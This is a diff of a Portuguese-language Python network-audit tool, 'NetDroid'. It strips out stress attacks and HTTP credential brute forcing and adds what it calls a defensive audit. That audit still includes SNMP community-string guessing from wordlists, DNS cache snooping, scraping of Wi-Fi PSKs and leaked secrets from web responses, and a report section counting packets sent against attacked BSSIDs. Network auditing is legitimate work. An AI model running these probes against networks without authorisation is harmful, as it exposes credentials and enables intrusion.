+                                        textColor=rl_colors.HexColor("#cc0000"),
+                                        fontSize=14, spaceBefore=12, spaceAfter=6)
+            estilo_p = ParagraphStyle("P", parent=styles["BodyText"],
+                                       fontSize=9, leading=12)
+            elementos = []
+            elementos.append(Paragraph(f"NetDroid v{VERSION} — Relatório Executivo", estilo_h1))
+            elementos.append(Paragraph(
+                f"Gerado em: {datetime.now().strftime('%d/%m/%Y %H:%M')}", estilo_p))
+            elementos.append(Spacer(1, 12))
+
+            # Resumo
+            total_vulns = sum(len(h.get("vulns", []) or []) for h in hosts)
+            risks = god.get("risks", [])
+            elementos.append(Paragraph("Resumo Geral", estilo_h2))
+            elementos.append(Paragraph(
+                f"<b>Hosts:</b> {len(hosts)} · <b>Vulnerabilidades:</b> {total_vulns} · "
+                f"<b>Riscos:</b> {len(risks)} · <b>Modo Root:</b> "
+                f"{'ativo (' + ctx_priv.motor + ')' if ctx_priv and ctx_priv.ativo else 'inativo'}",
+                estilo_p))
+
+            # Tabela de hosts
+            elementos.append(Paragraph("Inventário de Hosts", estilo_h2))
+            tabela_dados = [["IP", "Hostname", "Tipo", "Vendor", "Portas", "Risk"]]
+            for h in hosts[:60]:
+                tabela_dados.append([
+                    h.get("ip", "?"),
+                    (h.get("hostname", "") or "—")[:18],
+                    h.get("device_type", "?")[:14],
+                    (h.get("vendor", "?") or "?")[:12],
+                    str(len(h.get("ports", []))),
+                    str(next((r["score"] for r in risks if r["ip"] == h["ip"]), 0)),
+                ])
+            t = RLTable(tabela_dados, repeatRows=1)
+            t.setStyle(TableStyle([
+                ("BACKGROUND", (0, 0), (-1, 0), rl_colors.HexColor("#1a0000")),
+                ("TEXTCOLOR", (0, 0), (-1, 0), rl_colors.HexColor("#cc0000")),
+                ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
+                ("FONTSIZE", (0, 0), (-1, -1), 8),
+                ("BOTTOMPADDING", (0, 0), (-1, 0), 6),
+                ("GRID", (0, 0), (-1, -1), 0.3, rl_colors.HexColor("#444")),
+            ]))
+            elementos.append(t)
+
+            # Top vulnerabilidades
+            if total_vulns:
+                elementos.append(PageBreak())
+                elementos.append(Paragraph("Top Vulnerabilidades", estilo_h2))
+                vrows = [["IP", "Porta", "Severidade", "Dica/CVE"]]
+                for h in hosts:
+                    for v in (h.get("vulns", []) or [])[:3]:
+                        vrows.append([
+                            h["ip"], str(v.get("porta", "?")),
+                            v.get("severidade", "info").upper(),
+                            v.get("dica_cve", "")[:60],
+                        ])
+                vt = RLTable(vrows, repeatRows=1, colWidths=[3*cm, 1.5*cm, 2*cm, 9*cm])
+                vt.setStyle(TableStyle([
+                    ("BACKGROUND", (0, 0), (-1, 0), rl_colors.HexColor("#1a0000")),
+                    ("TEXTCOLOR", (0, 0), (-1, 0), rl_colors.HexColor("#cc0000")),
+                    ("FONTSIZE", (0, 0), (-1, -1), 7),
+                    ("GRID", (0, 0), (-1, -1), 0.3, rl_colors.HexColor("#444")),
+                ]))
+                elementos.append(vt)
+
+            # Kamikase
+            if kamikase.get("ativo"):
+                elementos.append(PageBreak())
+                elementos.append(Paragraph("Kamikase — Death Toll", estilo_h2))
+                elementos.append(Paragraph(
+                    f"Total: <b>{kamikase.get('total_pacotes', 0):,}</b> pacotes · "
+                    f"Duração: {kamikase.get('duracao_s', 0):.1f}s · "
+                    f"BSSIDs atacados: {len(kamikase.get('alvos', []))}",
+                    estilo_p))
+
+            doc.build(elementos)
+            self.ui.success(f"PDF: {path}")
+            return path
+        except Exception as e:
+            self.ui.error(f"Falha ao gerar PDF: {e}")
+            return None
+
+
 # ═══════════════════ GOD MODE ═════════════════════════════════
 
 class GodMode:
-    """Broadcast + NetBIOS + HTTP deep probe + credential audit + RTSP."""
+    """Deep defensive audit: inventory, exposure mapping and risk scoring."""
 
     def __init__(self, ui: TerminalUI, detector: NetworkDetector,
                  hosts: List[Dict[str, Any]]):
@@ -1217,29 +6492,217 @@ class GodMode:
         self.det = detector
         self.hosts = hosts
         self.found_creds: List[Dict] = []
+        self.risk_findings: List[Dict] = []
         self.ssdp_devices: List[Dict] = []
         self.rtsp_streams: List[Dict] = []
         self.onvif_devices: List[Dict] = []
 
     async def run(self):
-        self.ui.section("GOD MODE — FULL NETWORK INTERACTION")
-        if not self.ui.consent("O God Mode agora inclui ataques de stress (Slowloris/RTSP-Kill) e Brute-force. Continuar?"):
-            self.ui.warn("God Mode cancelado.")
-            return
-        
-        # Sequência completa "God"
+        self.ui.section("GOD MODE - DEEP DEFENSIVE AUDIT")
+        emitir("fase", nome="AUDITORIA — fingerprints + amplificação + paths default", indice="3/3")
+        # Sob --live ou --root, pula o consent (já dado pela escolha de modo)
+        if not priv_ativo() and event_bus is None:
+            if not self.ui.consent("Auditoria profunda da rede com coleta detalhada. Continuar?"):
+                self.ui.warn("God Mode cancelado.")
+                return
+
+        # Sequencia de auditoria defensiva
         await self.run_onvif()
         await self._broadcast_sweep()
         await self._netbios_scan()
         await self._http_deep_probe()
         await self._rtsp_discovery()
-        await self.run_mirai()
-        
-        # Ataques de Stress (Somente se no God Mode)
-        await self.run_slowloris()
-        await self.run_rtsp_kill()
-        
+        await self._sondar_servicos_amplificacao()
+        await self._sondar_paths_default()
+        self._sugerir_creds_padrao()
+        # ─── Boost --root: técnicas privilegiadas ───
+        if priv_ativo():
+            await self._upgrade_root()
+        self._assess_risks()
         self._print_god_summary()
+
+    # ──────────── BOOST --root ─────────────────────────────────
+
+    async def _upgrade_root(self):
+        """Ativado quando --root presente. Adiciona em cada host:
+        - SNMP wordlist expandida (40+ communities)
+        - DNS cache snooping (queries não-recursivas em domínios populares)
+        - LLDP/CDP sniff (scapy) — switches/routers vizinhos
+        - ARP spoof passivo (tcpdump — gratuitous ARP suspeito)
+        - Pcap seletivo via tcpdump (10s, busca creds)"""
+        self.ui.section("ROOT BOOST — Auditoria Apex Privilegiada")
+        loop = asyncio.get_event_loop()
+
+        # 1) SNMP mass com wordlist expandida
+        for host in self.hosts:
+            if 161 not in host.get("ports", []):
+                continue
+            try:
+                resultado = await loop.run_in_executor(None, self._snmp_mass, host["ip"])
+                if resultado:
+                    host["root_findings"] = host.get("root_findings", [])
+                    host["root_findings"].append({
+                        "tipo": "snmp_mass",
+                        "evidencia": f"{len(resultado)} communities aceitas: "
+                                    f"{', '.join(c for c, _ in resultado[:5])}",
+                        "severidade": "alta",
+                        "plataforma": ctx_priv.motor if ctx_priv else "?",
+                    })
+                    host["snmp_creds"] = host.get("snmp_creds", [])
+                    for community, sysd in resultado:
+                        host["snmp_creds"].append({"community": community, "sys_descr": sysd[:120]})
+            except Exception:
+                pass
+
+        # 2) DNS cache snooping
+        for host in self.hosts:
+            if 53 not in host.get("ports", []):
+                continue
+            try:
+                cacheados = await loop.run_in_executor(None, self._dns_cache_snoop, host["ip"])
+                if cacheados:
+                    host.setdefault("root_findings", []).append({
+                        "tipo": "dns_cache_snoop",
+                        "evidencia": f"Domínios cacheados: {', '.join(cacheados[:5])}",
+                        "severidade": "media",
+                        "plataforma": ctx_priv.motor if ctx_priv else "?",
+                    })
+            except Exception:
+                pass
+
+        # 3) LLDP/CDP sniff (scapy, 15s — só Linux/Kali com scapy)
+        if tem_cap("scapy") and ctx_priv and ctx_priv.motor == "root-kali":
+            try:
+                lldp_info = await loop.run_in_executor(None, self._sniff_lldp_cdp, 15)
+                if lldp_info:
+                    # LLDP é por interface, não por host — guarda na 1ª host (gateway)
+                    alvo = next((h for h in self.hosts if h.get("is_gateway")), self.hosts[0] if self.hosts else None)
+                    if alvo:
+                        alvo.setdefault("root_findings", []).append({
+                            "tipo": "lldp_cdp",
+                            "evidencia": "; ".join(lldp_info[:3]),
+                            "severidade": "media",
+                            "plataforma": "root-kali",
+                        })
+            except Exception:
+                pass
+
+        # 4) ARP spoof passivo via tcpdump (10s — Linux/Kali e Termux)
+        if tem_cap("tcpdump") and ctx_priv and ctx_priv.motor in ("root-kali", "root-termux"):
+            try:
+                achados = await loop.run_in_executor(None, self._tcpdump_arp_spoof, 10)
+                for ip_susp, evid in achados.items():
+                    h = next((x for x in self.hosts if x["ip"] == ip_susp), None)
+                    if h:
+                        h.setdefault("root_findings", []).append({
+                            "tipo": "arp_spoof_detected",
+                            "evidencia": evid,
+                            "severidade": "alta",
+                            "plataforma": ctx_priv.motor,
+                        })
+            except Exception:
+                pass
+        self.ui.success("Root boost concluído.")
+
+    def _snmp_mass(self, ip: str) -> List[Tuple[str, str]]:
+        """Testa todas as comunidades em SNMP_COMMUNITIES_ROOT.
+        Retorna lista [(community, sys_descr_ou_ok)]."""
+        achados = []
+        for community in SNMP_COMMUNITIES_ROOT:
+            try:
+                pacote = self._montar_pacote_snmp(community)
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.settimeout(0.8)
+                s.sendto(pacote, (ip, 161))
+                data, _ = s.recvfrom(2048)
+                s.close()
+                if not data or b"\xa2" not in data[:64]:
+                    continue
+                ascii_chunks = re.findall(rb"[\x20-\x7e]{6,}", data)
+                rel = [c.decode("ascii", errors="ignore") for c in ascii_chunks
+                       if c.decode("ascii", errors="ignore") != community]
+                achados.append((community, rel[0] if rel else "ok"))
+            except Exception:
+                continue
+        return achados
+
+    def _dns_cache_snoop(self, ip: str) -> List[str]:
+        """Query não-recursiva (RD=0) em domínios populares; resposta = cacheado."""
+        cacheados = []
+        dominios = ["google.com", "facebook.com", "youtube.com", "netflix.com",
+                    "instagram.com", "whatsapp.com", "tiktok.com"]
+        for dom in dominios:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.settimeout(0.7)
+                # Header DNS com RD=0 (não recursivo)
+                tx = random.randint(0, 0xFFFF).to_bytes(2, "big")
+                flags = b"\x00\x00"  # RD=0
+                qdcount = b"\x00\x01"
+                anc = nsc = arc = b"\x00\x00"
+                qname = b""
+                for parte in dom.split("."):
+                    qname += bytes([len(parte)]) + parte.encode("ascii")
+                qname += b"\x00"
+                qtype = b"\x00\x01"  # A
+                qclass = b"\x00\x01"
+                pkt = tx + flags + qdcount + anc + nsc + arc + qname + qtype + qclass
+                s.sendto(pkt, (ip, 53))
+                data, _ = s.recvfrom(512)
+                s.close()
+                if len(data) > 12:
+                    # Se ANCOUNT > 0, está cacheado (servidor respondeu sem recursão)
+                    ancount = (data[6] << 8) | data[7]
+                    if ancount > 0:
+                        cacheados.append(dom)
+            except Exception:
+                continue
+        return cacheados
+
+    def _sniff_lldp_cdp(self, timeout_s: int) -> List[str]:
+        """Sniff frames LLDP (01:80:c2:00:00:0e) e CDP (01:00:0c:cc:cc:cc)."""
+        if not HAS_SCAPY:
+            return []
+        info: List[str] = []
+        try:
+            pkts = sniff(filter="ether host 01:80:c2:00:00:0e or ether host 01:00:0c:cc:cc:cc",
+                         timeout=timeout_s, store=True)
+            for p in pkts[:10]:
+                # Heurística simples: extrai strings ASCII do payload
+                raw = bytes(p)
+                ascii_chunks = re.findall(rb"[\x20-\x7e]{4,}", raw)
+                rel = [c.decode("ascii", errors="ignore") for c in ascii_chunks][:5]
+                if rel:
+                    info.append(" | ".join(rel))
+        except Exception:
+            return info
+        return info
+
+    def _tcpdump_arp_spoof(self, timeout_s: int) -> Dict[str, str]:
+        """Roda `tcpdump -i any arp -c 200 -n` por timeout_s e detecta
+        IPs com mais de um MAC (gratuitous ARP suspeito)."""
+        ip_para_macs: Dict[str, Set[str]] = defaultdict(set)
+        try:
+            cmd = ["tcpdump", "-i", "any", "arp", "-n", "-l", "-c", "200"]
+            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
+            t0 = time.time()
+            while time.time() - t0 < timeout_s and proc.poll() is None:
+                line = proc.stdout.readline().decode("ascii", errors="ignore")
+                # Padrão: "is-at MAC" e "tell IP"
+                m = re.search(r"(\d+\.\d+\.\d+\.\d+).*?is-at\s+([0-9a-f:]+)", line, re.I)
+                if m:
+                    ip_para_macs[m.group(1)].add(m.group(2).upper())
+            try:
+                proc.terminate()
+            except Exception:
+                pass
+        except Exception:
+            return {}
+        suspeitos = {}
+        for ip, macs in ip_para_macs.items():
+            if len(macs) > 1:
+                suspeitos[ip] = f"IP com {len(macs)} MACs distintos: {', '.join(macs)}"
+        return suspeitos
 
     async def _broadcast_sweep(self):
         self.ui.info("UDP Broadcast sweep...")
@@ -1334,18 +6797,10 @@ class GodMode:
             self.ui.success(f"NetBIOS: {len(found_hosts)} hosts Windows encontrados")
             for h in found_hosts:
                 self.ui.info(f"  {h['ip']}: {', '.join(h['names'][:3])}")
-            self._send_netbios_message(found_hosts)
+            self.ui.info("NetBIOS em modo inventario: nenhuma mensagem ativa enviada.")
 
     def _send_netbios_message(self, hosts: List[Dict]):
-        self.ui.info(f"Enviando mensagem NetBIOS: \"{NETBIOS_MESSAGE}\"")
-        for h in hosts:
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                msg_data = NETBIOS_MESSAGE.encode("utf-8")
-                sock.sendto(msg_data, (h["ip"], 138))
-                sock.close()
-            except Exception:
-                pass
+        self.ui.warn("Envio de mensagem NetBIOS desativado por seguranca.")
 
     async def _http_deep_probe(self):
         if not HAS_AIOHTTP or not HAS_BS4:
@@ -1369,7 +6824,7 @@ class GodMode:
                 for port in ports:
                     await self._probe_web(session, host, port)
                     await self._probe_api_endpoints(session, host, port)
-                    await self._audit_default_creds(session, host, port)
+                    await self._evaluate_login_surface(session, host, port)
 
     async def _probe_web(self, session, host: Dict, port: int):
         ip = host["ip"]
@@ -1388,26 +6843,58 @@ class GodMode:
                     "vendor": vendor, "has_login": has_login,
                     "status": resp.status,
                 })
-                label = f"[LOGIN]" if has_login else ""
-                self.ui.info(f"  {ip}:{port} — {title} | {server} | {vendor} {label}")
+                # Caça a PSK / chave WiFi exposta em JS/HTML não-obfuscado
+                psk_achados = self._detectar_psk_em_html(text)
+                if psk_achados:
+                    for p in psk_achados:
+                        host.setdefault("psk_leaks", []).append(
+                            {"port": port, "tipo": p["tipo"], "psk": p["psk"]})
+                    self.ui.error(
+                        f"  ⚠ PSK EXPOSTA: {ip}:{port} → "
+                        f"{psk_achados[0]['psk'][:8]}*** ({psk_achados[0]['tipo']})")
+                label = "[LOGIN]" if has_login else ""
+                psk_lbl = " [PSK]" if psk_achados else ""
+                self.ui.info(f"  {ip}:{port} — {title} | {server} | {vendor} {label}{psk_lbl}")
         except Exception:
             pass
 
+    def _detectar_psk_em_html(self, html_text: str) -> List[Dict[str, str]]:
+        """Procura padrões de PSK/chave WiFi em JS embutido ou HTML.
+        Retorna lista de {tipo, psk}. Filtra valores que claramente não são PSK
+        (curtos demais, urls, palavras comuns)."""
+        achados: List[Dict[str, str]] = []
+        if not html_text:
+            return achados
+        vistas = set()
+        for regex, descricao in PSK_PATTERNS:
+            try:
+                for m in re.finditer(regex, html_text):
+                    psk = m.group(1)
+                    if not psk or psk in vistas:
+                        continue
+                    # WPA-PSK válido: 8 a 63 chars; chave hex: 64 chars
+                    if not (8 <= len(psk) <= 64):
+                        continue
+                    # Filtro anti-falso-positivo: ignora valores triviais
+                    baixo = psk.lower()
+                    if baixo in ("password", "passphrase", "your_password",
+                                 "yourpassword", "<password>", "{{password}}",
+                                 "********", "xxxxxxxx", "00000000"):
+                        continue
+                    if psk.startswith(("http://", "https://", "ftp://", "/")):
+                        continue
+                    vistas.add(psk)
+                    achados.append({"tipo": descricao, "psk": psk})
+            except re.error:
+                continue
+        return achados
+
     def _fingerprint_device(self, title: str, body: str, server: str) -> str:
-        combined = f"{title} {body[:2000]} {server}".lower()
-        signatures = {
-            "tp-link": "TP-Link", "tplink": "TP-Link", "dahua": "Dahua",
-            "hikvision": "Hikvision", "hikdigital": "Hikvision",
-            "asus": "ASUS", "mikrotik": "MikroTik", "routeros": "MikroTik",
-            "d-link": "D-Link", "dlink": "D-Link", "netgear": "Netgear",
-            "ubiquiti": "Ubiquiti", "unifi": "Ubiquiti",
-            "linksys": "Linksys", "cisco": "Cisco",
-            "huawei": "Huawei", "intelbras": "Intelbras",
-            "fortinet": "Fortinet", "fortigate": "Fortinet",
-        }
-        for key, vendor in signatures.items():
-            if key in combined:
-                return vendor
+        # Usa a base global DEVICE_FINGERPRINTS (50+ assinaturas)
+        combinado = f"{title} {body[:2000]} {server}".lower()
+        for fp in DEVICE_FINGERPRINTS:
+            if fp["marker"] in combinado:
+                return fp["vendor"]
         return "Unknown"
 
     async def _probe_api_endpoints(self, session, host: Dict, port: int):
@@ -1424,31 +6911,418 @@ class GodMode:
             except Exception:
                 pass
 
-    async def _audit_default_creds(self, session, host: Dict, port: int):
+    async def _evaluate_login_surface(self, session, host: Dict, port: int):
         web_info = host.get("web_info", [])
         port_info = next((w for w in web_info if w["port"] == port), None)
         if not port_info or not port_info.get("has_login"):
             return
-        vendor = port_info.get("vendor", "Unknown").lower()
-        creds = DEFAULT_CREDS.get(vendor, []) + DEFAULT_CREDS["generic"]
         ip = host["ip"]
         scheme = "https" if port in (443, 8443) else "http"
+        url = f"{scheme}://{ip}:{port}/"
+        auth_headers = 0
+        auth_basic = 0
+        try:
+            async with session.get(url, ssl=False) as resp:
+                headers = {k.lower(): v for k, v in resp.headers.items()}
+                auth_hdr = headers.get("www-authenticate", "")
+                if auth_hdr:
+                    auth_headers = 1
+                if "basic" in auth_hdr.lower():
+                    auth_basic = 1
+        except Exception:
+            pass
+        host.setdefault("login_surfaces", []).append({
+            "ip": ip,
+            "port": port,
+            "url": url,
+            "auth_header_present": bool(auth_headers),
+            "basic_auth_present": bool(auth_basic),
+        })
 
-        for user, passwd in creds[:10]:
+    async def _sondar_servicos_amplificacao(self):
+        """Probes leves: SNMP (várias comunidades), NTP monlist, DNS version.bind."""
+        self.ui.info("Sondando serviços de amplificação (SNMP/NTP/DNS)...")
+        loop = asyncio.get_event_loop()
+        for host in self.hosts:
+            portas = set(host.get("ports", []))
+            ip = host["ip"]
+            if 161 in portas:
+                try:
+                    resultado = await loop.run_in_executor(None, self._snmp_communities, ip)
+                    if resultado:
+                        community, sys_descr = resultado
+                        host.setdefault("amplificacao", []).append(
+                            {"servico": "snmp", "evidencia": f"community '{community}' aceita: {sys_descr[:60]}"})
+                        host.setdefault("snmp_creds", []).append(
+                            {"community": community, "sys_descr": sys_descr[:120]})
+                except Exception:
+                    pass
+            if 123 in portas:
+                try:
+                    resp = await loop.run_in_executor(None, self._ntp_monlist, ip)
+                    if resp:
+                        host.setdefault("amplificacao", []).append(
+                            {"servico": "ntp", "evidencia": "monlist respondeu"})
+                except Exception:
+                    pass
+            if 53 in portas:
+                try:
+                    resp = await loop.run_in_executor(None, self._dns_version, ip)
+                    if resp:
+                        host.setdefault("amplificacao", []).append(
+                            {"servico": "dns", "evidencia": resp[:80]})
+                except Exception:
+                    pass
+
+    def _montar_pacote_snmp(self, community: str) -> bytes:
+        """Constrói SNMPv1 GetRequest para sysDescr.0 (1.3.6.1.2.1.1.1.0)
+        com community arbitrária. Retorna BER cru."""
+        c = community.encode("ascii", errors="ignore")
+        # Varbind: OID sysDescr.0 (8 bytes) + NULL
+        oid = bytes.fromhex("06082b06010201010100")
+        valor_null = bytes.fromhex("0500")
+        vb_inner = oid + valor_null
+        vb = b"\x30" + bytes([len(vb_inner)]) + vb_inner
+        vbs_inner = vb
+        vbs = b"\x30" + bytes([len(vbs_inner)]) + vbs_inner
+        # PDU body: request-id (4 bytes), error-status, error-index, varbinds
+        pdu_body = (b"\x02\x04\x17\x00\x00\x00"
+                    b"\x02\x01\x00"
+                    b"\x02\x01\x00" + vbs)
+        pdu = b"\xa0" + bytes([len(pdu_body)]) + pdu_body
+        # Top: version (0 = SNMPv1) + community + PDU
+        top = (b"\x02\x01\x00"
+               + b"\x04" + bytes([len(c)]) + c
+               + pdu)
+        return b"\x30" + bytes([len(top)]) + top
+
+    def _snmp_communities(self, ip: str) -> Optional[Tuple[str, str]]:
+        """Testa SNMP_COMMUNITIES até a primeira aceita. Retorna
+        (community, sys_descr) ou None."""
+        for community in SNMP_COMMUNITIES:
             try:
-                auth = aiohttp.BasicAuth(user, passwd)
-                url = f"{scheme}://{ip}:{port}/"
-                async with session.get(url, auth=auth, ssl=False) as resp:
-                    if resp.status in (200, 301, 302):
-                        text = await resp.text(errors="ignore")
-                        if "logout" in text.lower() or "dashboard" in text.lower() or resp.status == 200:
-                            cred_info = {"ip": ip, "port": port, "user": user,
-                                         "password": passwd, "vendor": vendor}
-                            self.found_creds.append(cred_info)
-                            self.ui.success(f"  [CRED] {ip}:{port} — {user}:{passwd}")
-                            return
+                pacote = self._montar_pacote_snmp(community)
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.settimeout(1.0)
+                s.sendto(pacote, (ip, 161))
+                data, _ = s.recvfrom(2048)
+                s.close()
+                if not data or b"\xa2" not in data[:64]:
+                    continue
+                # Resposta válida (PDU GetResponse 0xA2). Extrai sysDescr ASCII.
+                ascii_chunks = re.findall(rb"[\x20-\x7e]{6,}", data)
+                # Filtra a própria community do retorno
+                relevantes = [c.decode("ascii", errors="ignore")
+                              for c in ascii_chunks
+                              if c.decode("ascii", errors="ignore") != community]
+                sys_descr = relevantes[0] if relevantes else "snmp_ok"
+                return (community, sys_descr)
             except Exception:
-                pass
+                continue
+        return None
+
+    def _ntp_monlist(self, ip: str) -> bool:
+        """Mode 7 monlist request — se responder, está vulnerável a amplificação."""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(1.5)
+            pacote = b"\x17\x00\x03\x2a" + b"\x00" * 4
+            s.sendto(pacote, (ip, 123))
+            data, _ = s.recvfrom(2048)
+            s.close()
+            return len(data) > 8
+        except Exception:
+            return False
+
+    def _dns_version(self, ip: str) -> str:
+        """Query CHAOS TXT version.bind."""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(1.5)
+            pacote = (
+                b"\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
+                b"\x07version\x04bind\x00\x00\x10\x00\x03"
+            )
+            s.sendto(pacote, (ip, 53))
+            data, _ = s.recvfrom(512)
+            s.close()
+            ascii_chunks = re.findall(rb"[\x20-\x7e]{4,}", data[12:])
+            return ascii_chunks[0].decode("ascii", errors="ignore") if ascii_chunks else "dns_resp"
+        except Exception:
+            return ""
+
+    async def _sondar_paths_default(self):
+        """Sonda paths críticos (admin + segredos). Para cada hit < 400, lê os
+        primeiros 4 KB do body e cruza contra LEAK_PATTERNS para confirmar
+        vazamento real. Hits sem confirmação ficam como `paths_default`,
+        hits confirmados viram `secret_leaks` (severidade crítica)."""
+        if not HAS_AIOHTTP:
+            return
+        # Paths administrativos (status 200 já é finding, sem precisar confirmar body)
+        paths_admin = ["/phpmyadmin/", "/wp-admin/", "/manager/html",
+                       "/server-status", "/server-info", "/HNAP1/",
+                       "/jmx-console", "/console", "/actuator/health"]
+        # Paths que vazam segredos — exigem confirmação no body
+        paths_segredos = SECRET_PATHS
+
+        web_hosts = [h for h in self.hosts
+                     if any(p in h.get("ports", []) for p in (80, 443, 8080, 8443))]
+        if not web_hosts:
+            return
+        self.ui.info(f"Caça a segredos: {len(paths_admin) + len(paths_segredos)} paths "
+                     f"em {len(web_hosts)} hosts web...")
+        timeout = aiohttp.ClientTimeout(total=2)
+        conn = aiohttp.TCPConnector(limit=30, ssl=False, force_close=True)
+        async with aiohttp.ClientSession(timeout=timeout, connector=conn) as ses:
+            for host in web_hosts:
+                ip = host["ip"]
+                porta = next((p for p in (80, 8080, 443, 8443) if p in host.get("ports", [])), 80)
+                esquema = "https" if porta in (443, 8443) else "http"
+                base = f"{esquema}://{ip}:{porta}"
+
+                # 1) Paths administrativos — só status code importa
+                for path in paths_admin:
+                    try:
+                        async with ses.get(base + path, ssl=False, allow_redirects=False) as resp:
+                            if resp.status < 400:
+                                host.setdefault("paths_default", []).append(
+                                    {"path": path, "status": resp.status})
+                    except Exception:
+                        continue
+
+                # 2) Paths de segredos — leem o body e cruzam com LEAK_PATTERNS
+                for path in paths_segredos:
+                    try:
+                        async with ses.get(base + path, ssl=False, allow_redirects=False) as resp:
+                            if resp.status >= 400:
+                                continue
+                            ct = resp.headers.get("Content-Type", "").lower()
+                            # Pula HTML genérico (404 personalizado disfarçado de 200)
+                            if "text/html" in ct and resp.status == 200 and path.startswith("/."):
+                                # arquivos dotfile não devem retornar HTML; provável armadilha
+                                pass
+                            body_bytes = await resp.content.read(4096)
+                            body = body_bytes.decode("utf-8", errors="ignore")
+                            evidencias = self._extrair_leaks(body)
+                            if evidencias:
+                                host.setdefault("secret_leaks", []).append({
+                                    "path": path,
+                                    "status": resp.status,
+                                    "achados": evidencias,
+                                    "tamanho_bytes": len(body_bytes),
+                                })
+                                self.ui.error(
+                                    f"  ⚠ LEAK: {ip}:{porta}{path} → "
+                                    f"{', '.join(e['tipo'] for e in evidencias)}")
+                            else:
+                                # Status 200 num path sensível, mas sem padrão confirmado:
+                                # registramos como "exposição" (atenção, não crítico).
+                                host.setdefault("paths_default", []).append(
+                                    {"path": path, "status": resp.status})
+                    except Exception:
+                        continue
+
+    def _extrair_leaks(self, body: str) -> List[Dict[str, str]]:
+        """Aplica LEAK_PATTERNS no body. Retorna lista de achados confirmados."""
+        achados: List[Dict[str, str]] = []
+        if not body:
+            return achados
+        for regex, descricao in LEAK_PATTERNS:
+            try:
+                m = re.search(regex, body)
+                if m:
+                    # Trecho mascarado (mostra só os primeiros 8 chars do segredo)
+                    trecho = m.group(0)
+                    if len(trecho) > 80:
+                        trecho = trecho[:80] + "..."
+                    achados.append({"tipo": descricao, "trecho": trecho})
+            except re.error:
+                continue
+        return achados
+
+    def _sugerir_creds_padrao(self):
+        """Cruza vendor identificado (web fingerprint OU MAC vendor) com
+        DEFAULT_CREDS para sugerir credenciais padrão prováveis. Passivo:
+        nenhuma tentativa de login é feita, apenas registra a sugestão."""
+        # Mapa de aliases vendor → chave em DEFAULT_CREDS (em minúsculas)
+        aliases = {
+            "tp-link": "tp-link", "tplink": "tp-link",
+            "dahua": "dahua", "hikvision": "hikvision",
+            "asus": "asus", "asustek": "asus",
+            "mikrotik": "mikrotik", "routeros": "mikrotik",
+            "d-link": "d-link", "dlink": "d-link",
+            "linksys": "linksys", "cisco": "cisco", "cisco-linksys": "cisco",
+            "huawei": "huawei", "xiaomi": "xiaomi",
+            "tenda": "tenda", "zte": "zte",
+            "ubiquiti": "ubiquiti", "unifi": "ubiquiti",
+            "axis": "axis", "foscam": "foscam", "reolink": "reolink",
+            "amcrest": "amcrest", "netgear": "netgear",
+            "synology": "synology", "qnap": "qnap",
+            "intelbras": "intelbras", "fortinet": "fortinet",
+        }
+
+        for host in self.hosts:
+            vendores: Set[str] = set()
+            # 1) Vendor obtido via fingerprint web (mais confiável)
+            for w in host.get("web_info", []):
+                v = (w.get("vendor") or "").strip().lower()
+                if v and v != "unknown":
+                    vendores.add(v)
+            # 2) Vendor obtido via MAC OUI (fallback)
+            mac_vendor = (host.get("vendor") or "").strip().lower()
+            if mac_vendor and mac_vendor not in ("unknown", "n/a", ""):
+                vendores.add(mac_vendor)
+
+            sugestoes: List[Dict[str, Any]] = []
+            for v in vendores:
+                chave = aliases.get(v)
+                if not chave or chave not in DEFAULT_CREDS:
+                    continue
+                pares = DEFAULT_CREDS[chave]
+                if not pares:
+                    continue
+                sugestoes.append({
+                    "vendor_detectado": v,
+                    "chave_banco": chave,
+                    "pares": [f"{u}:{p}" if p else f"{u}:(vazio)" for u, p in pares],
+                    "fonte": "web_info" if v != mac_vendor else "mac_oui",
+                })
+            # Sempre inclui as credenciais genéricas como ponto de atenção mínimo
+            # se houver painel de login detectado
+            tem_login = any(w.get("has_login") for w in host.get("web_info", []))
+            if tem_login and not sugestoes:
+                pares = DEFAULT_CREDS.get("generic", [])
+                if pares:
+                    sugestoes.append({
+                        "vendor_detectado": "genérico",
+                        "chave_banco": "generic",
+                        "pares": [f"{u}:{p}" if p else f"{u}:(vazio)" for u, p in pares[:6]],
+                        "fonte": "login_panel",
+                    })
+            if sugestoes:
+                host["creds_padrao_sugeridas"] = sugestoes
+
+    def _assess_risks(self):
+        findings: List[Dict[str, Any]] = []
+        for host in self.hosts:
+            ip = host["ip"]
+            ports = set(host.get("ports", []))
+            issues: List[str] = []
+            score = 0
+
+            if 23 in ports:
+                issues.append("Telnet exposto")
+                score += 35
+            if 21 in ports:
+                issues.append("FTP exposto")
+                score += 20
+            if 445 in ports:
+                issues.append("SMB exposto")
+                score += 15
+            if 3389 in ports:
+                issues.append("RDP exposto")
+                score += 20
+            if 554 in ports:
+                issues.append("RTSP exposto")
+                score += 20
+            if 161 in ports:
+                issues.append("SNMP exposto")
+                score += 10
+            if 53 in ports:
+                issues.append("DNS exposto")
+                score += 5
+            if 123 in ports:
+                issues.append("NTP exposto")
+                score += 5
+            if 6379 in ports:
+                issues.append("Redis exposto")
+                score += 25
+            if 27017 in ports:
+                issues.append("MongoDB exposto")
+                score += 25
+            if 9200 in ports:
+                issues.append("Elasticsearch exposto")
+                score += 25
+            if 2375 in ports:
+                issues.append("Docker API exposta")
+                score += 30
+
+            for web in host.get("web_info", []):
+                if web.get("has_login"):
+                    issues.append(f"Painel de login na porta {web.get('port')}")
+                    score += 15
+                if web.get("status", 0) >= 500:
+                    issues.append(f"Instabilidade web na porta {web.get('port')}")
+                    score += 5
+                vendor = (web.get("vendor") or "Unknown").lower()
+                if vendor != "unknown":
+                    issues.append(f"Fingerprint IoT/vendor: {web.get('vendor')}")
+                    score += 5
+
+            if host.get("api_endpoints"):
+                issues.append(f"API endpoints acessíveis: {len(host.get('api_endpoints', []))}")
+                score += 15
+
+            for amp in host.get("amplificacao", []):
